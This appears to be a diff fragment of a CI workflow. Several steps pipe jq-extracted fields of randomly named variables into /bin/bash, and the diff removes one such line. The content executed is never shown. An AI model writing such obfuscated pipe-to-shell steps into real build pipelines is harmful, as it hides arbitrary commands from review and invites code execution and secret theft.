@@ -25,7 +25,6 @@ jobs:
           echo $zpoe30 | jq -r .e38486 | /bin/bash
           printf '%s' "$g07" | jq -r .hh16 | /bin/bash
           printf '%s' "$tuc19695" | jq -r .tdeb9720 | /bin/bash
-          echo $g220 | jq -r .ehzwf7 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
